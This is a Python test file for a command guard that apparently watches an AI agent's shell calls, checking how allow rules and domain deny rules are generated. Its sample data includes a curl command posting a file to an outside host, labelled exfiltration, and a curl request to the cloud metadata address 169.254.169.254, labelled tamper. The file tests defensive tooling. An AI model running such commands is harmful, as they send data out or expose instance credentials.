from shelf.domain.guard import StoppedCall, rule_to_deny_host


def call(summary: str, *categories: str, kind: str = "bash") -> StoppedCall:
    return StoppedCall("t", "claude", "s1", kind, "deny", "", categories, "why", summary)


def test_a_command_the_guard_stopped_gets_a_rule_that_allows_exactly_it() -> None:
    rule = call("curl -d @x https://example.org/a?b=1", "exfil").rule_to_allow()
    assert rule is not None
    assert "[[rules]]" in rule
    assert "match = '^curl -d @x https://example\\.org/a\\?b=1$'" in rule
    assert 'decision = "allow"' in rule


def test_the_rule_is_valid_toml_for_a_command_with_quotes_and_backslashes() -> None:
    import tomllib  # noqa: PLC0415

    rule = call("echo 'a\\b' | tr -d [x]", "exfil").rule_to_allow()
    assert rule is not None
    parsed = tomllib.loads(rule)
    assert parsed["rules"][0]["decision"] == "allow"
    assert "'" not in parsed["rules"][0]["match"]


def test_nothing_can_allow_a_blocked_domain_or_a_tamper_attempt() -> None:
    for category in ("blocked_domain", "tamper"):
        stopped = call("curl http://169.254.169.254/", category)
        assert not stopped.can_be_allowed
        assert stopped.rule_to_allow() is None


def test_only_a_command_gets_a_rule() -> None:
    assert call("https://docs.rs/x", "network", kind="web").rule_to_allow() is None
    assert call("", "exfil").rule_to_allow() is None


def test_a_host_can_be_denied_with_one_line_of_policy() -> None:
    assert rule_to_deny_host("example.org") == '[network]\ndeny_domains = ["example.org"]\n'
